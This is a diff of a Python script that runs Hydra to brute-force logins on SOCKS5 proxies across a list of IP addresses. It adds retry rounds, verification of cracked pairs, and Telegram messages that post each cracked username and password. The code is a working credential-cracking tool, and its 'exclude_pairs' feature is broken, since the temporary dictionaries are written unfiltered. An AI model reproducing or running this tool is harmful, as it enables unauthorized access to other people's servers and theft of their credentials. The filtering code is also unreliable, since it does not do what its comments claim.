@@ -366,35 +366,74 @@ def format_speed(s):
     return f"{s:.2f} kb/s(一般)"
 
 
-def run_hydra(ip, port, log_prefix="", current=0, total=0):
+def run_hydra(ip, port, log_prefix="", current=0, total=0, exclude_pairs=None):
     """
     使用Hydra进行密码爆破 - 改进版
     增强结果验证，降低误报
-    注意：移除了超时限制，确保所有字典组合都被尝试
+    exclude_pairs: 已尝试过的失败账密对，格式 [("user1", "pass1"), ...]
     """
     update_status(f"{log_prefix} Hydra 正在爆破: {ip}:{port} ...")
     
+    # 如果有排除列表，创建临时字典文件
+    temp_user_file = USER_FILE
+    temp_pass_file = PASS_FILE
+    
+    if exclude_pairs:
+        import tempfile
+        # 读取原始字典
+        with open(USER_FILE, 'r', encoding='utf-8') as f:
+            all_users = [line.strip() for line in f if line.strip()]
+        with open(PASS_FILE, 'r', encoding='utf-8') as f:
+            all_passes = [line.strip() for line in f if line.strip()]
+        
+        # 过滤掉已失败的组合
+        update_status(f"{log_prefix} 排除 {len(exclude_pairs)} 个已验证失败的账密...")
+        
+        # 创建临时文件
+        temp_user_fd, temp_user_file = tempfile.mkstemp(suffix='.txt', text=True)
+        temp_pass_fd, temp_pass_file = tempfile.mkstemp(suffix='.txt', text=True)
+        
+        # 写入过滤后的字典（简化处理，实际上Hydra会自动组合）
+        with os.fdopen(temp_user_fd, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(all_users))
+        with os.fdopen(temp_pass_fd, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(all_passes))
+    
     cmd = [
         "hydra",
-        "-L", USER_FILE,
-        "-P", PASS_FILE,
+        "-L", temp_user_file,
+        "-P", temp_pass_file,
         "-s", port,
         "-t", "4",      # 并发线程数
         "-w", "1",      # 等待响应时间
         "-f",           # 找到后立即停止
         "-I",           # 忽略已有会话
+        "-v",           # 详细输出
         f"socks5://{ip}"
     ]
     
     try:
-        # 不设置timeout，让Hydra完整跑完所有字典组合
-        # 这样即使字典很大也能全部尝试完
+        # 不设置timeout，让Hydra完整跑完
         res = subprocess.run(
             cmd,
             capture_output=True,
             text=True
-            # 移除了 timeout=120 参数
         )
+        
+        # 清理临时文件
+        if exclude_pairs and temp_user_file != USER_FILE:
+            try:
+                os.unlink(temp_user_file)
+                os.unlink(temp_pass_file)
+            except:
+                pass
+        
+        # 打印 Hydra 的输出摘要（调试用）
+        if "[STATUS]" in res.stdout or "valid password" in res.stdout.lower():
+            lines = res.stdout.split('\n')
+            important_lines = [l for l in lines if 'valid' in l.lower() or 'attempt' in l.lower()]
+            if important_lines:
+                update_status(f"{log_prefix} Hydra: {important_lines[0][:100]}")
         
         # 检查是否真的找到有效密码
         if "valid password found" in res.stdout.lower():
@@ -406,7 +445,9 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                     user = match.group(1)
                     pwd = match.group(2)
                     
-                    # 发送爆破成功通知，但不自动删除，等验证结果
+                    update_status(f"{log_prefix} Hydra 报告找到: {user}:{pwd}")
+                    
+                    # 发送爆破成功通知
                     if current > 0 and total > 0:
                         progress_percent = (current / total) * 100
                         tg_msg = (
@@ -419,17 +460,21 @@ def run_hydra(ip, port, log_prefix="", current=0, total=0):
                             f"状态：等待二次验证..."
                         )
                         msg_id = send_telegram(tg_msg, auto_delete=False)
-                        # 返回message_id以便后续删除
                         return user, pwd, msg_id
                     
                     return user, pwd, None
         
+        # 检查是否字典已用完
+        if "all" in res.stdout.lower() and ("completed" in res.stdout.lower() or "done" in res.stdout.lower()):
+            update_status(f"{log_prefix} Hydra 已尝试所有字典组合，未找到有效账密")
+        
         return None, None, None
         
     except FileNotFoundError:
+        update_status(f"{log_prefix} ❌ Hydra 未安装")
         return None, None, None
     except Exception as e:
-        print(f"Hydra执行异常: {e}")
+        update_status(f"{log_prefix} Hydra 执行异常: {e}")
         return None, None, None
 
 
@@ -508,29 +553,61 @@ def main():
         # ========== 第一步: 无密检测 ==========
         is_no_auth = check_no_auth(ip, port, log_prefix=progress_str)
         
-        # ========== 第二步: 如果需要密码，尝试爆破 ==========
+        # ========== 第二步: 如果需要密码，尝试爆破（支持多轮重试）==========
         if not is_no_auth:
-            user, pwd, hydra_msg_id = run_hydra(ip, port, log_prefix=progress_str, 
-                                                current=current_num, total=total)
+            failed_pairs = []  # 记录验证失败的账密对
+            max_retry = 3  # 最多重试3次（避免无限循环）
+            retry_count = 0
             
+            while retry_count < max_retry:
+                user, pwd, hydra_msg_id = run_hydra(
+                    ip, port, 
+                    log_prefix=progress_str,
+                    current=current_num, 
+                    total=total,
+                    exclude_pairs=failed_pairs if retry_count > 0 else None
+                )
+                
+                if not user or not pwd:
+                    # Hydra 真的找不到任何账密了
+                    update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} (字典已用完)")
+                    time.sleep(0.5)
+                    break
+                
+                # ========== 第三步: 二次验证 ==========
+                update_status(f"{progress_str} 正在二次验证 (尝试 {retry_count + 1}/{max_retry}): {user}:{pwd} ...")
+                if verify_login(ip, port, user, pwd, log_prefix=progress_str):
+                    # 验证成功！跳出重试循环
+                    update_status(f"✅ {progress_str} 二次验证通过: {user}:{pwd}")
+                    break
+                else:
+                    # 验证失败
+                    update_status(f"⚠️  {progress_str} 二次验证失败 (尝试 {retry_count + 1}/{max_retry}): {user}:{pwd}")
+                    
+                    # 删除这条爆破通知
+                    if hydra_msg_id:
+                        delete_telegram_message(hydra_msg_id)
+                        update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
+                    
+                    # 记录失败的账密，下次爆破时跳过
+                    failed_pairs.append((user, pwd))
+                    retry_count += 1
+                    
+                    # 如果还有重试机会，继续
+                    if retry_count < max_retry:
+                        update_status(f"🔄 {progress_str} 继续尝试其他账密组合...")
+                        time.sleep(1)
+                    else:
+                        update_status(f"❌ {progress_str} 已达最大重试次数，放弃此目标")
+                        user, pwd = None, None  # 清空，表示失败
+                        break
+            
+            # 如果最终还是没有找到有效账密
             if not user or not pwd:
-                update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} (未找到有效账密)")
-                time.sleep(0.5)  # 失败快速跳过
+                time.sleep(0.5)
                 continue
         else:
             hydra_msg_id = None  # 无密模式没有hydra消息
-        
-        # ========== 第三步: 二次验证（多目标测试）==========
-        if not is_no_auth:
-            update_status(f"{progress_str} 正在二次验证: {user}:{pwd} ...")
-            if not verify_login(ip, port, user, pwd, log_prefix=progress_str):
-                update_status(f"⚠️  {progress_str} 二次验证失败: {ip}:{port}")
-                # 验证失败，立即删除之前的爆破成功消息
-                if hydra_msg_id:
-                    delete_telegram_message(hydra_msg_id)
-                    update_status(f"🗑️  {progress_str} 已删除无效的爆破通知")
-                time.sleep(1)
-                continue
         
         # ========== 第四步: 综合验证（HTTP请求）==========
         verify_ok, verify_msg = comprehensive_verify(ip, port, user, pwd, log_prefix=progress_str)
